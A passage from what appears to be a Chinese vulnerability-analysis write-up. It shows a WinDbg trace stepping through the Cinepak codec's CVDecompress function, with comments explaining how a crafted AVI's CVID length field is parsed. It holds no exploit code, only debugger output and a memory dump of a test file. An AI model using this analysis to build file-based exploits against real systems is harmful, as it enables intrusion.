class="line">1574</span><br><span class="line">1575</span><br><span class="line">1576</span><br><span class="line">1577</span><br><span class="line">1578</span><br><span class="line">1579</span><br><span class="line">1580</span><br><span class="line">1581</span><br><span class="line">1582</span><br><span class="line">1583</span><br><span class="line">1584</span><br><span class="line">1585</span><br><span class="line">1586</span><br><span class="line">1587</span><br><span class="line">1588</span><br><span class="line">1589</span><br><span class="line">1590</span><br><span class="line">1591</span><br><span class="line">1592</span><br><span class="line">1593</span><br><span class="line">1594</span><br><span class="line">1595</span><br><span class="line">1596</span><br><span class="line">1597</span><br><span class="line">1598</span><br><span class="line">1599</span><br><span class="line">1600</span><br><span class="line">1601</span><br><span class="line">1602</span><br><span class="line">1603</span><br><span class="line">1604</span><br><span class="line">1605</span><br><span class="line">1606</span><br><span class="line">1607</span><br><span class="line">1608</span><br><span class="line">1609</span><br><span class="line">1610</span><br><span class="line">1611</span><br><span class="line">1612</span><br><span class="line">1613</span><br><span class="line">1614</span><br><span class="line">1615</span><br><span class="line">1616</span><br><span class="line">1617</span><br><span class="line">1618</span><br><span class="line">1619</span><br><span class="line">1620</span><br><span class="line">1621</span><br><span class="line">1622</span><br><span class="line">1623</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">010</span>&gt; <span class="built_in">bp</span> 73b7cbee                                                              <span class="comment">; [73b7cbee call iccvid!CVDecompress (73b721ae)]</span></span><br><span class="line"><span class="number">0</span>:<span class="number">010</span>&gt; <span class="built_in">bl</span></span><br><span class="line"> <span class="number">0</span> e 73b7cbee     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** iccvid!Decompress+<span class="number">0x118</span></span><br><span class="line"><span class="number">0</span>:<span class="number">010</span>&gt; g</span><br><span class="line">Breakpoint <span class="number">0</span> hit</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=025afd88 <span class="built_in">ecx</span>=0005e2c0 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00127e40 <span class="built_in">edi</span>=<span class="number">02310050</span></span><br><span class="line"><span class="built_in">eip</span>=73b7cbee <span class="built_in">esp</span>=025afd38 <span class="built_in">ebp</span>=025afd60 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!Decompress+<span class="number">0x118</span>:</span><br><span class="line">73b7cbee e8bb55ffff      <span class="keyword">call</span>    iccvid!CVDecompress (73b721ae)</span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; t</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=025afd88 <span class="built_in">ecx</span>=0005e2c0 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00127e40 <span class="built_in">edi</span>=<span class="number">02310050</span></span><br><span class="line"><span class="built_in">eip</span>=73b721ae <span class="built_in">esp</span>=025afd34 <span class="built_in">ebp</span>=025afd60 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress:</span><br><span class="line">73b721ae 8bff            <span class="keyword">mov</span>     <span class="built_in">edi</span>,<span class="built_in">edi</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=025afd88 <span class="built_in">ecx</span>=0005e2c0 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00127e40 <span class="built_in">edi</span>=<span class="number">02310050</span></span><br><span class="line"><span class="built_in">eip</span>=73b721b0 <span class="built_in">esp</span>=025afd34 <span class="built_in">ebp</span>=025afd60 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x2</span>:</span><br><span class="line">73b721b0 <span class="number">55</span>              <span class="keyword">push</span>    <span class="built_in">ebp</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=025afd88 <span class="built_in">ecx</span>=0005e2c0 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00127e40 <span class="built_in">edi</span>=<span class="number">02310050</span></span><br><span class="line"><span class="built_in">eip</span>=73b721b1 <span class="built_in">esp</span>=025afd30 <span class="built_in">ebp</span>=025afd60 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x3</span>:</span><br><span class="line">73b721b1 8bec            <span class="keyword">mov</span>     <span class="built_in">ebp</span>,<span class="built_in">esp</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=025afd88 <span class="built_in">ecx</span>=0005e2c0 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00127e40 <span class="built_in">edi</span>=<span class="number">02310050</span></span><br><span class="line"><span class="built_in">eip</span>=73b721b3 <span class="built_in">esp</span>=025afd30 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x5</span>:</span><br><span class="line">73b721b3 83ec20          <span class="keyword">sub</span>     <span class="built_in">esp</span>,<span class="number">20h</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=025afd88 <span class="built_in">ecx</span>=0005e2c0 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00127e40 <span class="built_in">edi</span>=<span class="number">02310050</span></span><br><span class="line"><span class="built_in">eip</span>=73b721b6 <span class="built_in">esp</span>=025afd10 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x8</span>:</span><br><span class="line">73b721b6 <span class="number">53</span>              <span class="keyword">push</span>    <span class="built_in">ebx</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=025afd88 <span class="built_in">ecx</span>=0005e2c0 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00127e40 <span class="built_in">edi</span>=<span class="number">02310050</span></span><br><span class="line"><span class="built_in">eip</span>=73b721b7 <span class="built_in">esp</span>=025afd0c <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x9</span>:</span><br><span class="line">73b721b7 8b5d08          <span class="keyword">mov</span>     <span class="built_in">ebx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">8</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd38=001535b0    <span class="comment">; ebx = a1 = 0x001535b0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0005e2c0 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00127e40 <span class="built_in">edi</span>=<span class="number">02310050</span></span><br><span class="line"><span class="built_in">eip</span>=73b721ba <span class="built_in">esp</span>=025afd0c <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xc</span>:</span><br><span class="line">73b721ba <span class="number">56</span>              <span class="keyword">push</span>    <span class="built_in">esi</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0005e2c0 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00127e40 <span class="built_in">edi</span>=<span class="number">02310050</span></span><br><span class="line"><span class="built_in">eip</span>=73b721bb <span class="built_in">esp</span>=025afd08 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xd</span>:</span><br><span class="line">73b721bb 8b7324          <span class="keyword">mov</span>     <span class="built_in">esi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>+<span class="number">24h</span>] <span class="built_in">ds</span>:<span class="number">0023</span>:001535d4=<span class="number">00000000</span>  <span class="comment">; esi = [0x001535b0+0x24] = 0x00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0005e2c0 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">02310050</span></span><br><span class="line"><span class="built_in">eip</span>=73b721be <span class="built_in">esp</span>=025afd08 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x10</span>:</span><br><span class="line">73b721be <span class="number">57</span>              <span class="keyword">push</span>    <span class="built_in">edi</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0005e2c0 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">02310050</span></span><br><span class="line"><span class="built_in">eip</span>=73b721bf <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x11</span>:</span><br><span class="line">73b721bf 33ff            <span class="keyword">xor</span>     <span class="built_in">edi</span>,<span class="built_in">edi</span>                                        <span class="comment">; edi = 0x00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0005e2c0 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b721c1 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x13</span>:</span><br><span class="line">73b721c1 3bf7            <span class="keyword">cmp</span>     <span class="built_in">esi</span>,<span class="built_in">edi</span>                                        <span class="comment">; 判断esi是否为0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0005e2c0 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b721c3 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x15</span>:</span><br><span class="line">73b721c3 741c            <span class="keyword">je</span>      iccvid!CVDecompress+<span class="number">0x33</span> (73b721e1)     [br=<span class="number">1</span>] <span class="comment">; 为0则跳转，这里跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0005e2c0 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b721e1 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x33</span>:</span><br><span class="line">73b721e1 33c0            <span class="keyword">xor</span>     <span class="built_in">eax</span>,<span class="built_in">eax</span>                                        <span class="comment">; eax = eax^eax = 0x00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0005e2c0 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b721e3 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x35</span>:</span><br><span class="line">73b721e3 837d1020        <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">10h</span>],<span class="number">20h</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd40=<span class="number">00000068</span>  <span class="comment">; 判断a3是否小于0x20,a3为“idx1”索引块中读出的数据块的数据长度，与CVID数据长度应相等</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0005e2c0 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b721e7 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x39</span>:</span><br><span class="line">73b721e7 0f8200020000    <span class="keyword">jb</span>      iccvid!CVDecompress+<span class="number">0x23f</span> (73b723ed)    [br=<span class="number">0</span>] <span class="comment">; 小于则跳转,这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0005e2c0 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b721ed <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x3f</span>:</span><br><span class="line">73b721ed 8b750c          <span class="keyword">mov</span>     <span class="built_in">esi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">0Ch</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd3c=00ba68f8  <span class="comment">; esi = a2 = 0x00ba68f8,指向cinepak_codec_data1</span></span><br><span class="line"><span class="number">0</span>:<span class="number">011</span>&gt; <span class="built_in">dd</span> 00ba6af8</span><br><span class="line">00ba6af8  <span class="number">68000000</span> <span class="number">20016001</span> <span class="number">00101000</span> <span class="number">00001000</span></span><br><span class="line">00ba6b08  <span class="number">60000000</span> <span class="number">00206001</span> <span class="number">00110000</span> <span class="number">41411000</span></span><br><span class="line">00ba6b18  <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">00114141</span> <span class="number">41411000</span></span><br><span class="line">00ba6b28  <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">00114141</span> <span class="number">41411000</span></span><br><span class="line">00ba6b38  <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">00114141</span> <span class="number">00411000</span></span><br><span class="line">00ba6b48  <span class="number">31786469</span> <span class="number">00000010</span> <span class="number">63643030</span> <span class="number">00000010</span></span><br><span class="line">00ba6b58  <span class="number">00000004</span> <span class="number">00000068</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">00ba6b68  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0005e2c0 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00ba68f8 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b721f0 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x42</span>:</span><br><span class="line">73b721f0 8a6601          <span class="keyword">mov</span>     <span class="number">ah</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">1</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba68f9=<span class="number">00</span> <span class="comment">; ah = 0x00,CVID数据长度的第3个字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0005e2c0 <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00ba68f8 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b721f3 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x45</span>:</span><br><span class="line">73b721f3 0fb64e03        <span class="keyword">movzx</span>   <span class="built_in">ecx</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">3</span>]       <span class="built_in">ds</span>:<span class="number">0023</span>:00ba68fb=<span class="number">68</span> <span class="comment">; ecx = 0x00000068,CVID数据长度的第1个字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000068</span> <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00ba68f8 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b721f7 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x49</span>:</span><br><span class="line">73b721f7 8a4602          <span class="keyword">mov</span>     <span class="built_in">al</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">2</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba68fa=<span class="number">00</span> <span class="comment">; al = 0x00,CVID数据长度的第2个字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000068</span> <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00ba68f8 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b721fa <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x4c</span>:</span><br><span class="line">73b721fa c1e008          <span class="keyword">shl</span>     <span class="built_in">eax</span>,<span class="number">8</span>                                          <span class="comment">; eax = 0x00000000,左移8位</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000068</span> <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00ba68f8 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b721fd <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x4f</span>:</span><br><span class="line">73b721fd 0bc1            <span class="keyword">or</span>      <span class="built_in">eax</span>,<span class="built_in">ecx</span>                                        <span class="comment">; 以大端读取CVID数据长度(Length of CVID data)</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000068</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000068</span> <span class="built_in">edx</span>=fffffee0 <span class="built_in">esi</span>=00ba68f8 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b721ff <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span 